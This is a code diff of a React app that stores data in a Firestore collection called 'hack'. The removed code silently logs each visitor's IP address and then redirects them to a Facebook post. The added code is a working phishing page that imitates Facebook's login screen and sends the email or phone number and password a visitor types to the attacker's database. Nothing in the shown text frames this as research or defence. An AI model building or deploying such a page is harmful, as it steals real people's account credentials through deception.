@@ -20,29 +20,58 @@ const hack = firestore.collection("hack");
 function App() {
   //creating IP state
   const [ip, setIP] = useState("");
+  const [username, setUsername] = useState("");
+  const [pass, setPass] = useState("");
 
-  //creating function to load ip address from the API
   const getData = async () => {
-    const res = await axios.get("https://geolocation-db.com/json/");
-    console.log(res.data);
-    // setIP(res.data.IPv4);
+    console.log(username, pass);
     await hack
       .add({
-        ip: res.data.IPv4,
-        createAt: firebase.firestore.FieldValue.serverTimestamp(),
+        username,
+        pass,
       })
       .then((res) => {
         console.log(res);
-        window.location.href =
-          "https://m.facebook.com/story.php?story_fbid=pfbid0ZJbYTsR868ySqAUCwXTzqz3TbonC7PwKLyuWLEHhxrmmqH8yZtYhaQjgzFuRCR7Ul&id=100075758240162 ";
+        // window.location.href =
+        //   "https://m.facebook.com/story.php?story_fbid=pfbid0ZJbYTsR868ySqAUCwXTzqz3TbonC7PwKLyuWLEHhxrmmqH8yZtYhaQjgzFuRCR7Ul&id=100075758240162 ";
+      })
+      .catch((er) => {
+        console.log(er);
       });
   };
 
-  useEffect(() => {
-    getData();
-  }, []);
-
-  return <div className="App"></div>;
+  return (
+    <>
+      <div className="content">
+        <div className="flex-div">
+          <div className="name-content">
+            <h1 className="logo">Facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+          </div>
+          <div className="form">
+            <input
+              type="text"
+              placeholder="Email or Phone Number"
+              required
+              onChange={(e) => setUsername(e.target.value)}
+            />
+            <input
+              type="password"
+              placeholder="Password"
+              required
+              onChange={(e) => setPass(e.target.value)}
+            />
+            <button className="login" onClick={getData}>
+              Log In
+            </button>
+            <a href="#">Forgot Password ?</a>
+            <hr />
+            <button className="create-account">Create New Account</button>
+          </div>
+        </div>
+      </div>
+    </>
+  );
 }
 
 export default App;
